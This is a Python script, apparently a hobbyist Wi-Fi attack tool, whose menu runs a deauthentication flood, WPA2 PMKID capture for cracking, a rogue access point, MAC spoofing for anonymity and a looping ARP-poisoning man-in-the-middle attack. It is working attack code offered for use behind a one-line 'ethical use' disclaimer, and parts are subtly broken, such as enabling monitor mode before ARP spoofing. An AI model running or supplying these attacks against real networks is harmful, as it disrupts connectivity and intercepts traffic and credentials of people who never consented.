#!/usr/bin/env python3
import os
import time
import argparse
import datetime
import threading
import random
import re
from scapy.all import sniff, wrpcap, Dot11, Dot11Deauth, RadioTap, EAPOL, sendp, ARP, Ether, srp, conf


# Developer Watermark
DEVELOPER = "Harshit Mishra"
EMAIL = "securecoderdev@gmail.com"
WEBSITE = "https://mishraharshit.vercel.app"

BANNER = rf"""
  ████╗  ██╗   ██╗ ██████╗ ██████╗  █████╗ ██████╗ ███████╗
 ██╔══██╗██║   ██║██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔════╝
 ███████║██║   ██║██║  ███╗██████╔╝███████║██║  ██║█████╗  
 ██╔══██║██║   ██║██║   ██║██╔═══╝ ██╔══██║██║  ██║██╔══╝  
 ██║  ██║╚██████╔╝╚██████╔╝██║     ██║  ██║██████╔╝███████╗
 ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═════╝ ╚══════╝
              MR.ROBOT
   Advanced Wi-Fi Security & Penetration Tool
   Ethical use for educational purposes only.
   Developed by {DEVELOPER} | Email: {EMAIL}
      Visit: {WEBSITE}
"""

# Automatic Network Interface Detection
def get_wireless_interface():
    """Auto-detect the best Wi-Fi interface available."""
    interfaces = os.listdir("/sys/class/net/")
    for iface in interfaces:
        if "wlan" in iface:
            return iface
    print("❌ No Wi-Fi interface found! Please connect a wireless adapter.")
    exit(1)

def get_gateway_ip():
    """Automatically find the gateway IP address (Router IP)."""
    gateway_ip = os.popen("ip route show default | awk '/default/ {print $3}'").read().strip()
    return gateway_ip if gateway_ip else None

def get_target_ip(target_mac):
    """Automatically find the target IP based on the MAC address."""
    print(f"🔍 Searching for IP associated with MAC address {target_mac}...")
    result = os.popen(f"arp-scan --interface={get_wireless_interface()} --localnet | grep {target_mac}").read()
    if result:
        target_ip = result.split()[0]
        print(f"✅ Target IP: {target_ip} found for MAC: {target_mac}")
        return target_ip
    else:
        print(f"❌ Error: No IP found for target MAC address {target_mac}")
        exit(1)

# Ensure the script is run as root
def check_root():
    """Ensure the script is run as root."""
    if os.geteuid() != 0:
        print("❌ Error: This script must be run as root!")
        exit(1)

# Display automatic network information
def display_network_info():
    """Display network info such as interface, gateway, and connected devices."""
    interface = get_wireless_interface()
    gateway_ip = get_gateway_ip()

    print(f"🌐 Network Information:")
    print(f"✅ Wireless Interface: {interface}")
    print(f"✅ Gateway IP: {gateway_ip}")
    
    print("\n🔍 Scanning local network for devices...")
    devices = os.popen(f"arp-scan --interface={interface} --localnet").read()
    print("Connected Devices:")
    print(devices)

# Set interface to monitor mode
def enable_monitor_mode(interface):
    """Enable monitor mode if not already enabled."""
    os.system(f"ifconfig {interface} down")
    os.system(f"iwconfig {interface} mode monitor")
    os.system(f"ifconfig {interface} up")
    print(f"✅ {interface} set to Monitor Mode.")

def disable_monitor_mode(interface):
    """Disable monitor mode and switch back to managed mode."""
    os.system(f"ifconfig {interface} down")
    os.system(f"iwconfig {interface} mode managed")
    os.system(f"ifconfig {interface} up")
    print(f"✅ {interface} set to Managed Mode.")

# Spoof MAC address
def mac_spoof(interface):
    """Spoof MAC address for anonymity."""
    fake_mac = "00:" + ":".join(["%02x" % random.randint(0, 255) for _ in range(5)])
    os.system(f"ifconfig {interface} down")
    os.system(f"macchanger -m {fake_mac} {interface}")
    os.system(f"ifconfig {interface} up")
    print(f"🔄 MAC Address changed to {fake_mac}")

# Scan for Wi-Fi networks
def scan_wifi(interface):
    """Scan for Wi-Fi networks."""
    enable_monitor_mode(interface)
    print("🔍 Scanning for Wi-Fi networks...")
    os.system(f"airodump-ng {interface}")

# Sniff Wi-Fi packets and save them
def sniff_packets(interface, output_pcap):
    """Sniff Wi-Fi packets and save them."""
    print("🔍 Sniffing Wi-Fi packets... (Press Ctrl+C to stop)")
    packets = sniff(iface=interface, count=500)
    wrpcap(output_pcap, packets)
    print(f"✅ Packets saved to {output_pcap}")

# Perform a deauthentication attack
def deauth_attack(interface, target_mac, bssid, count=100):
    """Perform a deauthentication attack."""
    print(f"🚀 Starting Deauthentication Attack on {target_mac}...")

    deauth_pkt = RadioTap() / Dot11(addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)

    for _ in range(count):
        os.system(f"iwconfig {interface} channel 6")
        sendp(deauth_pkt, iface=interface, count=1, inter=0.1, verbose=False)

    print("✅ Attack Complete.")

# Capture WPA2 PMKID for cracking
def pmkid_attack(interface, output_pcap):
    """Capture WPA2 PMKID for cracking."""
    print("🔍 Capturing PMKID handshakes...")
    enable_monitor_mode(interface)
    os.system(f"hcxdumptool -i {interface} --enable_status=3 -o {output_pcap}")
    print(f"✅ PMKID Handshakes saved to {output_pcap}")

# Create a fake AP for penetration testing
def fake_ap(interface, ssid="FreeWiFi"):
    """Create a fake AP for penetration testing."""
    print(f"🚀 Creating Rogue AP: {ssid}")
    enable_monitor_mode(interface)
    os.system(f"airbase-ng -e {ssid} -c 6 {interface}")

# Perform MITM ARP Spoofing Attack
def mitm_attack(interface, target_ip, gateway_ip):
    """Perform an ARP Spoofing attack to intercept traffic."""
    print(f"🚀 Starting MITM Attack: ARP Spoofing {target_ip} and {gateway_ip}...")
    enable_monitor_mode(interface)

    # Threaded ARP Spoofing
    def arp_poison(target_ip, gateway_ip):
        packet1 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=target_ip, hwdst="00:00:00:00:00:00", psrc=gateway_ip)
        packet2 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=gateway_ip, hwdst="00:00:00:00:00:00", psrc=target_ip)
        sendp(packet1, iface=interface, verbose=False)
        sendp(packet2, iface=interface, verbose=False)
    
    while True:
        arp_poison(target_ip, gateway_ip)
        time.sleep(2)

# Main Function
def main():
    print(BANNER)
    check_root()

    display_network_info()

    print("\nPlease choose an operation from the options below:")
    print("1. Scan Wi-Fi networks")
    print("2. Sniff Wi-Fi packets")
    print("3. Perform Deauthentication Attack")
    print("4. Capture WPA2 PMKID")
    print("5. Create a Fake AP")
    print("6. Perform MITM ARP Spoofing Attack")

    choice = input("\nEnter the number corresponding to your choice: ")

    parser = argparse.ArgumentParser(description="Advanced Wi-Fi Security & Penetration Tool",
                                     epilog=f"Developed by {DEVELOPER} | {WEBSITE}")
    
    if choice == "1":
        scan_wifi(get_wireless_interface())
    elif choice == "2":
        output_pcap = input("Enter output PCAP file name: ")
        sniff_packets(get_wireless_interface(), output_pcap)
    elif choice == "3":
        target_mac = input("Enter target MAC address: ")
        bssid = input("Enter BSSID of the target AP: ")
        deauth_attack(get_wireless_interface(), target_mac, bssid)
    elif choice == "4":
        output_pcap = input("Enter output PCAP file name: ")
        pmkid_attack(get_wireless_interface(), output_pcap)
    elif choice == "5":
        ssid = input("Enter the SSID of the fake AP: ")
        fake_ap(get_wireless_interface(), ssid)
    elif choice == "6":
        target_ip = input("Enter target IP address: ")
        gateway_ip = input("Enter gateway IP address: ")
        mitm_attack(get_wireless_interface(), target_ip, gateway_ip)
    else:
        print("❌ Invalid choice, exiting.")
        exit(1)

if __name__ == "__main__":
    main()
